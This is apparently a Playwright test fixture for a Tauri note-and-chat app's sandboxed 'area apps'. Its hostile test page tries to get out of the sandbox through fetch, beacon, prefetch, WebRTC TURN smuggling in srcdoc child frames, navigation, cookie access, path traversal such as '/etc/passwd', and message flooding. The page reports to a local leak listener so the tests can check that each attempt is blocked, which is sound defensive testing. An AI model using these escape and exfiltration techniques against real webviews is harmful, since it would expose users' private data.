import { readFileSync } from 'node:fs';
import { expect, type Page } from '@playwright/test';
import { defaultNeeds, grantKey, htmlHash, resolveNeeds } from '../../src/interface/manifest.ts';

const seed = (name: string) => readFileSync(new URL(`../../areas-seed/${name}.html`, import.meta.url), 'utf8');

// The hostile app runs every attack from inside the frame and writes what it saw into #out.
export type Ports = { http: number; udp: number };
export const hostileApp = (ports: Ports) => `<!doctype html><html><body><pre id="out">running</pre><script>
(async () => {
  const R = {}, LEAK = ${JSON.stringify(`http://127.0.0.1:${ports.http}/leak`)}, TURN = ${JSON.stringify(`turn:127.0.0.1:${ports.udp}`)};
  const attempt = async (k, fn) => { try { const v = await fn(); R[k] = 'LEAK:' + String(v).slice(0, 60); } catch (e) { R[k] = 'blocked:' + (e && e.name || 'error'); } };
  const settle = (make) => new Promise((res) => { const t = setTimeout(() => res('blocked:timeout'), 1500); make((v) => { clearTimeout(t); res(v); }); });
  await attempt('fetch', () => fetch(LEAK + '?fetch').then((r) => r.status));
  R.xhr = await settle((done) => { try { const x = new XMLHttpRequest(); x.open('GET', LEAK + '?xhr'); x.onload = () => done('LEAK:xhr'); x.onerror = () => done('blocked:error'); x.send(); } catch (e) { done('blocked:' + e.name); } });
  R.ws = await settle((done) => { try { const w = new WebSocket('ws://127.0.0.1:1436/ws'); w.onopen = () => done('LEAK:ws'); w.onerror = () => done('blocked:error'); w.onclose = () => done('blocked:close'); } catch (e) { done('blocked:' + e.name); } });
  R.img = await settle((done) => { const i = new Image(); i.onload = () => done('LEAK:img'); i.onerror = () => done('blocked:error'); i.src = LEAK + '?img'; });
  await attempt('topRead', () => top.location.href);
  await attempt('topWrite', () => { top.location.href = LEAK + '?nav'; return 'no-throw'; });
  await attempt('parentDoc', () => parent.document.title);
  await attempt('tauri', () => typeof window.__TAURI_INTERNALS__ !== 'undefined' ? 'present' : (() => { throw Object.assign(new Error(), { name: 'absent' }); })());
  await attempt('parentTauri', () => parent.__TAURI_INTERNALS__);
  // Chromium throws in an opaque origin; WebKit returns '' (so only a value, or a write that persists, is a leak).
  await attempt('cookie', () => { const v = document.cookie; if (v) return v; document.cookie = 'leak=1'; if (document.cookie.indexOf('leak') >= 0) return 'persisted'; throw Object.assign(new Error(), { name: 'empty' }); });
  await attempt('storage', () => localStorage.length);
  await attempt('eval', () => eval('1+1'));
  await attempt('popup', () => { const w = window.open(LEAK + '?popup'); if (!w) throw Object.assign(new Error(), { name: 'null' }); return 'opened'; });
  const frame = document.createElement('iframe'); frame.src = LEAK + '?frame'; document.body.appendChild(frame);
  R.frame = await settle((done) => { frame.onload = () => done(frame.contentWindow ? 'loaded' : 'blocked:none'); frame.onerror = () => done('blocked:error'); setTimeout(() => done('blocked:not-loaded'), 1200); });

  // Quiet channels that ignore connect-src: prefetch hints, WebRTC (best effort), beacons.
  for (const rel of ['dns-prefetch', 'preconnect', 'prefetch', 'prerender']) { const l = document.createElement('link'); l.rel = rel; l.href = LEAK.replace('/leak', '') + '/' + rel; document.head.appendChild(l); }
  await attempt('beacon', () => { if (!navigator.sendBeacon(LEAK + '?beacon', 'x')) throw new Error('refused'); return 'queued'; });
  R.rtc = typeof RTCPeerConnection === 'undefined' && typeof webkitRTCPeerConnection === 'undefined' ? 'blocked:absent' : 'present';
  await attempt('rtcNew', () => { const pc = new RTCPeerConnection({ iceServers: [{ urls: TURN, username: 'SECRETUSER', credential: 'x' }] }); pc.createDataChannel('x'); return pc.createOffer().then((o) => pc.setLocalDescription(o)).then(() => 'constructed'); });
  // A srcdoc child frame is a fresh realm: the in-frame neutraliser never ran there. This is the review-2 P1-A escape.
  const kid = document.createElement('iframe');
  kid.srcdoc = '<script>try{var pc=new RTCPeerConnection({iceServers:[{urls:' + JSON.stringify(TURN) + ',username:"AARONS-PRIVATE-ROOM-MESSAGE",credential:"x"}]});pc.createDataChannel("x");pc.createOffer().then(function(o){return pc.setLocalDescription(o)})}catch(e){}<\\/script>';
  document.body.appendChild(kid);
  await new Promise((r) => setTimeout(r, 1500));

  const replies = {};
  addEventListener('message', (e) => { const m = e.data; if (m && (m.uni === 1 || m.pfr === 1) && m.id) (replies[m.id] = replies[m.id] || []).push(m); });
  const send = (m) => parent.postMessage(m, '*');
  const wait = (ms) => new Promise((r) => setTimeout(r, ms));
  const U = (id, ns, method, params, extra) => send({ uni: 1, id, ns, method, params, ...(extra || {}) });
  const F = (id, path, method) => send({ pfr: 1, channel: 'vault', id, method: method || 'GET', path, headers: {}, body: null });
  U('unk', 'fs', 'read', { path: '/etc/passwd' });
  U('unm', 'vault', 'constructor', {});
  U('big', 'chat', 'draft', { text: 'x'.repeat(9000) });
  U('room', 'chat', 'draft', { text: 'to a private room', room: 'uni-room' });
  U('out1', 'note', 'open', { ref: 'Areas/Atlas/Secret' });
  U('out2', 'note', 'open', { ref: 'Areas/Hostile/../Atlas/Secret' });
  U('out3', 'note', 'open', { ref: '/etc/passwd' });
  U('extra', 'theme', 'get', {}, { sneaky: true });
  F('v1', '/api/notes/' + encodeURIComponent('Areas/Atlas/Secret'));
  F('v2', '/api/notes?path_prefix=' + encodeURIComponent('Areas/Atlas/'));
  F('v3', '/api/notes?id=n-secret&include_content=true');
  F('v4', '/api/notes?search=ATLAS');
  F('v5', '/api/notes?path_prefix=' + encodeURIComponent('Areas/Hostile/../Atlas/'));
  F('v6', '/api/notes', 'POST');
  F('v7', '/api/notes/' + encodeURIComponent('Areas/Hostile/Own'));
  send('garbage'); send(null); send({ uni: 1 }); send({ uni: 1, id: 'z'.repeat(100), ns: 'theme', method: 'get' }); send({ uni: 2, id: 'ver', ns: 'theme', method: 'get' });
  await wait(700);
  const first = (id) => (replies[id] || []).map((m) => (m.error && m.error.code) || (m.pfr ? 'http' + m.status : 'result')).join(',') || 'none';
  const known = ['unk', 'unm', 'big', 'room', 'out1', 'out2', 'out3', 'extra', 'v1', 'v2', 'v3', 'v4', 'v5', 'v6', 'v7', 'ver'];
  for (const id of known) R['c:' + id] = first(id);
  R.vaultBodies = known.filter((k) => k[0] === 'v' && k.length === 2).map((k) => (replies[k] || []).map((m) => m.body || '').join('')).join('|');
  R['c:longid'] = Object.keys(replies).some((k) => k.length > 64) ? 'replied' : 'none';
  R.stray = Object.keys(replies).filter((k) => !known.includes(k)).join(',') || 'none';
  // Suggestion flood: only a few can be pending; none acts.
  for (let i = 0; i < 6; i++) U('s' + i, 'chat', 'draft', { text: 'suggestion ' + i });
  await wait(500);
  R.suggest = JSON.stringify([0, 1, 2, 3, 4, 5].map((i) => first('s' + i)));
  for (let i = 0; i < 100; i++) U('f' + i, 'theme', 'get', {});
  await wait(1200);
  let okN = 0, errN = 0, other = 0;
  for (let i = 0; i < 100; i++) { const m = (replies['f' + i] || [])[0]; if (!m) other++; else if ('error' in m) errN++; else okN++; }
  R.flood = JSON.stringify({ ok: okN, err: errN, none: other });
  document.getElementById('out').textContent = JSON.stringify(R);
})();
</script></body></html>`;

export const BENIGN = `<!doctype html><html><body style="font-family:var(--sans)"><h1 id="t">…</h1><p id="n">…</p><p id="th">…</p><p id="c">…</p><a id="jump" href="#section">Jump</a><h2 id="section">Section</h2><script>
uni.ready().then((ctx) => { document.getElementById('t').textContent = ctx.area.title; });
uni.theme.on((t) => { document.getElementById('th').textContent = 'accent=' + t.accent; });
uni.vault.queryNotes({ pathPrefix: 'Areas/Benign/', limit: 5 }).then((r) => { document.getElementById('n').textContent = r.map((x) => x.path.split('/').pop()).join('|'); });
uni.chat.recent(3).then((r) => { document.getElementById('c').textContent = 'msgs=' + r.messages.length; });
</script></body></html>`;

// A late navigation (after the frame loaded), one per vector. The listener must never see it.
export const navApp = (vector: 'self' | 'meta' | 'anchor' | 'write' | 'parse', ports: Ports) => {
  const url = `http://127.0.0.1:${ports.http}/leak?nav=${vector}`;
  const code = {
    self: `location.href = ${JSON.stringify(url)};`,
    meta: `const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=${url}'; document.head.appendChild(m);`,
    anchor: `const a = document.createElement('a'); a.href = ${JSON.stringify(url)}; document.body.appendChild(a); a.click();`,
    write: `document.open(); document.write('<meta http-equiv="refresh" content="0;url=${url}">'); document.close();`,
    parse: `location.href = ${JSON.stringify(url)};`,
  }[vector];
  // Navigating while the page is still parsing: no `load` ever follows, so a load counter can't see it.
  if (vector === 'parse') return `<!doctype html><html><body><p>nav parse</p><script>${code}</script></body></html>`;
  return `<!doctype html><html><body><p>nav ${vector}</p><script>addEventListener('load', () => setTimeout(() => { ${code} }, 150));</script></body></html>`;
};

// Asks for a draft and a note on load (no user action): both must only become pending suggestions.
export const SUGGEST = `<!doctype html><html><body><button id="go">go</button><button id="open">open</button><pre id="out">{}</pre><script>
const R = {};
const show = () => { document.getElementById('out').textContent = JSON.stringify(R); };
const call = (p) => p.then((r) => ({ result: r }), (e) => ({ error: e.code || e.message }));
(async () => {
  R.loadDraft = await call(uni.chat.draft('drafted on load'));
  R.loadOpen = await call(uni.note.open('Areas/Suggest/Alpha'));
  show();
})();
document.getElementById('go').onclick = async () => { R.click = await call(uni.chat.draft('from click')); show(); };
document.getElementById('open').onclick = async () => { R.outOfScope = await call(uni.note.open('Journal/2026/10/secret')); show(); };
</script></body></html>`;

// Review 2 P2-C: steal focus and keep asking, so any gesture heuristic would see "user is in the frame".
export const FOCUS_STEAL = `<!doctype html><html><body><input id="i"><script>
setInterval(() => { document.getElementById('i').focus(); window.focus(); }, 50);
setInterval(() => { uni.chat.draft('INJECTED BY APP ' + Date.now()).catch(() => {}); uni.note.open('Areas/Steal/Alpha').catch(() => {}); }, 400);
</script></body></html>`;

type Variant = 'seed' | 'test';

export type BootOpts = {
  selftest?: boolean; ipcLeak?: boolean;
  /** The mode of the seeded self-test record (default: a sealed pass). */
  mode?: 'sealed' | 'approved-code';
  ports?: Ports;
  /** Extra area apps (an `area` note plus an html `app` note each). `interface` is the manifest in the app note's metadata. */
  apps?: { name: string; html: string; interface?: unknown }[];
  /**
   * 'off' (default) simulates a webview without WebRTC (WebKitGTK's default): no frame, child frames included, has RTCPeerConnection.
   * 'native' leaves the real browser's WebRTC in place (Chromium has it).
   */
  webrtc?: 'off' | 'native';
  /** Pre-grant every app's default needs (default true). False shows the grant prompt. */
  granted?: boolean;
  /** Test-only seam: the self-test frames get no CSP meta (needs the VITE_AREAS_TESTHOOKS build). */
  stripCsp?: boolean;
  /** Names of apps whose stored grant records an OLDER html hash (the app changed since it was allowed). */
  staleHtml?: string[];
  /** Serve the host document without the Tauri CSP header. */
  noHostCsp?: boolean;
  /** `getVersion()` rejects. */
  versionFails?: boolean;
  /** The user agent recorded in the stored self-test pass (default: the real one). */
  passUa?: string;
};

export async function bootAreas(page: Page, variant: Variant = 'seed', opts: BootOpts = {}) {
  const now = Math.floor(Date.now() / 1000);
  const data = {
    now, variant, selftest: opts.selftest ?? true, ipcLeak: opts.ipcLeak ?? false, hostile: hostileApp(opts.ports ?? { http: 9, udp: 9 }), benign: BENIGN, techne: seed('techne'), unforced: seed('unforced'),
    apps: opts.apps ?? [], granted: opts.granted ?? true, webrtcOff: (opts.webrtc ?? 'off') === 'off', grantSeed: {} as Record<string, { scope: string; html: string }>, stripCsp: !!opts.stripCsp, versionFails: !!opts.versionFails, passUa: opts.passUa ?? null, mode: opts.mode ?? 'sealed',
  };
  // Pre-granted apps: the grant key is the SHA-256 of the RESOLVED default needs plus the app's html.
  const preGrant = [
    { id: 'app-techne', area: 'Techne', ch: 'ch-techne', html: data.techne }, { id: 'app-unf', area: 'Unforced Development', ch: 'ch-unf', html: data.unforced },
    { id: 'app-host', area: 'Hostile', ch: 'ch-techne', html: data.hostile }, { id: 'app-ben', area: 'Benign', ch: 'ch-techne', html: data.benign },
    ...data.apps.map((a) => ({ id: 'app-x-' + a.name, area: a.name, ch: 'ch-techne', html: a.html })),
  ];
  for (const g of preGrant) {
    const ctx = { areaPath: `Areas/${g.area}`, channels: [g.ch] };
    const stale = (opts.staleHtml ?? []).some((n) => g.id === 'app-x-' + n);
    data.grantSeed[g.id] = { scope: await grantKey(resolveNeeds(defaultNeeds(), ctx), ctx.areaPath), html: stale ? 'stale-' + await htmlHash(g.html) : await htmlHash(g.html) };
  }
  if (opts.noHostCsp) {
    await page.route((u) => new URL(u).pathname === '/', async (route) => {
      const response = await route.fetch();
      const headers = { ...response.headers() };
      delete headers['content-security-policy'];
      await route.fulfill({ response, headers });
    });
  }
  await page.addInitScript((d) => {
    // Simulates a webview that delivers IPC into every frame (wry/WebKitGTK or Android).
    if (d.ipcLeak) (window as any).ipc = { postMessage: () => {} };
    if (d.stripCsp) (window as any).__areasTest = { stripCsp: true };
    // Runs in every frame, srcdoc children included, before their scripts.
    if (d.webrtcOff) for (const n of ['RTCPeerConnection', 'webkitRTCPeerConnection', 'mozRTCPeerConnection', 'RTCDataChannel', 'RTCSessionDescription', 'RTCIceCandidate']) { try { Object.defineProperty(window, n, { value: undefined, configurable: true, writable: false }); } catch { /* already defined */ } }
    // Tauri injects its internals into the main frame only (for_main_frame_only: true), so sandboxed frames never get them.
    if (window.top !== window) return;
    const w = window as any;
    w.__calls = [];
    // The live-frame gate opens for this platform and version through a stored self-test pass.
    if (d.selftest && !localStorage.getItem('uni.areaApps.selftest.v1')) localStorage.setItem('uni.areaApps.selftest.v1', JSON.stringify({ platform: 'linux', passedAt: '2026-10-08T00:00:00Z', appVersion: 'dev', mode: d.mode, userAgent: d.passUa ?? navigator.userAgent }));
    if (d.granted && !localStorage.getItem('uni.interface.grants.v2')) {
      localStorage.setItem('uni.interface.grants.v2', JSON.stringify(Object.fromEntries(Object.entries(d.grantSeed as Record<string, { scope: string; html: string }>).map(([id, g]) => [id, { ...g, grantedAt: '2026-10-08T00:00:00Z' }]))));
    }
    const U = 'a'.repeat(64);
    const area = (id: string, name: string, status: string, ch: string, purpose: string) => ({
      id, path: `Areas/${name}`, extension: 'md', tags: ['area'], updatedAt: '2026-10-07T12:00:00Z', createdAt: '2026-09-01T00:00:00Z',
      metadata: { channel: ch, status, since: '2026-01-15' }, content: `# ${name}\n\n${purpose}\n\n## Notes\n\nSee [[Areas/${name}/Plan|the plan]].`,
    });
    const notes: any[] = [
      area('a-techne', 'Techne', 'foreground', 'ch-techne', 'The craft of building: tools, systems and the small daily practice of making things well.'),
      area('a-unf', 'Unforced Development', 'foreground', 'ch-unf', 'Client practice: facilitation, strategy and the long relationships that pay the bills.'),
      area('a-sad', 'Sadhana', 'background', 'ch-sad', 'Daily practice. Sitting, breath, and a slow return to what matters.'),
      area('a-atlas', 'Atlas', 'background', 'ch-atlas', 'A map of the commons: research, writing and the networks around it.'),
      area('a-rel', 'Relationships', 'background', '', 'The people I love and how I show up for them.'),
      area('a-exp', 'Expression', 'background', 'ch-exp', 'Writing, voice and making things for other people to see.'),
      { id: 'app-techne', path: 'Areas/Techne/app', extension: 'html', content: d.techne, updatedAt: '2026-10-07T00:00:00Z' },
      { id: 'app-unf', path: 'Areas/Unforced Development/app', extension: 'html', content: d.unforced, updatedAt: '2026-10-07T00:00:00Z' },
      { id: 'n-t1', path: 'Areas/Techne/Workbench log', extension: 'md', content: '# Workbench log\n\nTechne log body', updatedAt: new Date((d.now - 7200) * 1000).toISOString() },
      { id: 'n-t2', path: 'Areas/Techne/Plan', extension: 'md', content: '# Plan\n\nTechne plan body', updatedAt: new Date((d.now - 86400 * 3) * 1000).toISOString() },
      { id: 'n-t3', path: 'Areas/Techne/Tooling decisions', extension: 'md', content: '# Tooling\n\nbody', updatedAt: new Date((d.now - 86400) * 1000).toISOString() },
      { id: 'n-u1', path: 'Areas/Unforced Development/Q4 engagements', extension: 'md', content: '# Q4\n\nbody', updatedAt: new Date((d.now - 3600) * 1000).toISOString() },
      { id: 'n-u2', path: 'Areas/Unforced Development/Pricing', extension: 'md', content: '# Pricing\n\nbody', updatedAt: new Date((d.now - 86400 * 5) * 1000).toISOString() },
      { id: 'n-u3', path: 'Areas/Unforced Development/Proposal drafts', extension: 'md', content: '# Proposals\n\nbody', updatedAt: new Date((d.now - 86400 * 2) * 1000).toISOString() },
      { id: 'n-secret', path: 'Areas/Atlas/Secret', extension: 'md', content: '# Secret\n\nATLAS-SECRET-BODY', updatedAt: '2026-10-06T00:00:00Z' },
    ];
    if (d.variant === 'test') {
      notes.push(
        area('a-host', 'Hostile', 'foreground', 'ch-techne', 'An area whose app attacks the host.'),
        { id: 'app-host', path: 'Areas/Hostile/app', extension: 'html', content: d.hostile, updatedAt: '2026-10-07T00:00:00Z' },
        area('a-ben', 'Benign', 'foreground', 'ch-techne', 'An area whose app behaves.'),
        { id: 'app-ben', path: 'Areas/Benign/app', extension: 'html', content: d.benign, updatedAt: '2026-10-07T00:00:00Z' },
        { id: 'n-b1', path: 'Areas/Benign/Alpha', extension: 'md', content: '# Alpha', updatedAt: '2026-10-07T00:00:00Z' },
      );
    }
    for (const a of d.apps as { name: string; html: string }[]) {
      notes.push(area('a-x-' + a.name, a.name, 'foreground', 'ch-techne', `An area whose app is ${a.name}.`), { id: 'app-x-' + a.name, path: `Areas/${a.name}/app`, extension: 'html', content: a.html, ...(a.interface ? { metadata: { interface: a.interface } } : {}), updatedAt: '2026-10-07T00:00:00Z' },
        { id: 'n-x-' + a.name, path: `Areas/${a.name}/Alpha`, extension: 'md', content: '# Alpha', updatedAt: '2026-10-07T00:00:00Z' });
    }
    const msg = (ref: string, channel: string, name: string, ago: number, body: string) => ({ ref, channel, author: name === 'Aaron' ? U : 'b'.repeat(64), author_name: name, ts: d.now - ago, body, mentions_me: false, root: null, parent: null, mentions: [], reply_count: 0, last_reply_ts: null, edited: false, reactions: [] });
    const msgs: Record<string, any[]> = {
      'ch-techne': [...[['Uni', 'Parked the font question until the frame can load web fonts.'], ['Aaron', 'Rail labels still feel tight on the phone.'], ['Uni', 'Checked contrast on meta text; muted needed a darker tone.'], ['Aaron', 'Fine. Keep the green accent.'], ['Uni', 'Sandbox self-test is wired into Settings.'], ['Aaron', 'Run it on the laptop first.']].map(([n, b], i) => msg('t0' + i, 'ch-techne', n, 86400 * (6 - i) + 7200, b)), msg('t1', 'ch-techne', 'Aaron', 86400, 'Scoping the area apps: one HTML note per area, sealed frame, bridge only.'), msg('t2', 'ch-techne', 'Uni', 5400, 'Drafted the bridge reference. Compose never sends, you stay in control.'), msg('t3', 'ch-techne', 'Aaron', 1800, 'Good. Ship Techne first, then the practice dashboard.')],
      'ch-unf': [msg('u1', 'ch-unf', 'Uni', 14000, 'Two proposals are waiting on a decision about scope.'), msg('u2', 'ch-unf', 'Aaron', 600, 'I will call them Thursday.')],
      'ch-sad': [msg('s1', 'ch-sad', 'Aaron', 90000, 'Sat twenty minutes. Restless but stayed.')],
    };
    const lastOf = (c: string) => msgs[c]?.[msgs[c].length - 1];
    const room = (id: string, name: string, unread = 0) => ({ id, name, unread, mentions: false, last_message: lastOf(id)?.body ?? null, last_ts: lastOf(id)?.ts ?? null });
    const rooms = [room('uni-room', 'Uni'), room('ch-techne', 'Techne'), room('ch-unf', 'Unforced Dev'), room('ch-sad', 'Sadhana'), room('ch-atlas', 'Atlas'), room('ch-exp', 'Expression')];
    const rowOf = (n: any) => ({ id: n.id, path: n.path, extension: n.extension, updatedAt: n.updatedAt });
    w.__TAURI_INTERNALS__ = {
      metadata: { currentWindow: { label: 'main' }, currentWebview: { label: 'main' } }, transformCallback: () => 1,
      invoke: async (cmd: string, args: any) => {
        w.__calls.push({ cmd, args });
        switch (cmd) {
          case 'plugin:app|version': if (d.versionFails) throw 'version unavailable'; return 'dev';
          case 'identity_status': return { paired: true, pubkey: U };
          case 'get_identity': return U;
          case 'get_npub': return 'test';
          case 'get_rooms': return rooms;
          case 'get_messages': return args.root ? [] : (msgs[args.channel] ?? []).slice(-(args.limit ?? 300));
          case 'get_members': return [{ pubkey: U, name: 'Aaron', named: true }];
          case 'vault_paths': return notes.map(rowOf);
          case 'vault_list': return ['uni'];
          case 'vault_note': {
            const n = notes.find((x) => x.id === args.noteRef || x.path === args.noteRef);
            if (!n) throw 'note not found: ' + args.noteRef;
            return { hub: 'https://example.invalid', vault: 'uni', note: { createdAt: '2026-09-01T00:00:00Z', tags: [], metadata: {}, ...n } };
          }
          case 'journal_config': return { hub: 'https://example.invalid', vault: 'uni' };
          case 'vault_search': return notes.filter((n) => (n.content ?? '').toLowerCase().includes(String(args.query).toLowerCase()) && (!args.pathPrefix || (n.path ?? '').startsWith(args.pathPrefix))).slice(0, args.limit ?? 20).map((n) => ({ vault: 'uni', id: n.id, path: n.path, snippet: String(n.content).slice(0, 60), score: null, mode: 'keyword' }));
          case 'journal_pending': case 'journal_list': case 'search_messages': return [];
          case 'journal_flush': return { sent: [], remaining: 0, error: null };
          case 'refresh': return { pubkey: U, total_items: 0, channel_errors: {}, truncated_channels: [] };
          default: return null;
        }
      },
    };
    w.__TAURI_EVENT_PLUGIN_INTERNALS__ = { unregisterListener: () => {} };
  }, data);
  await page.goto('/');
  await expect(page.getByRole('textbox', { name: 'Message Uni' })).toBeVisible();
}
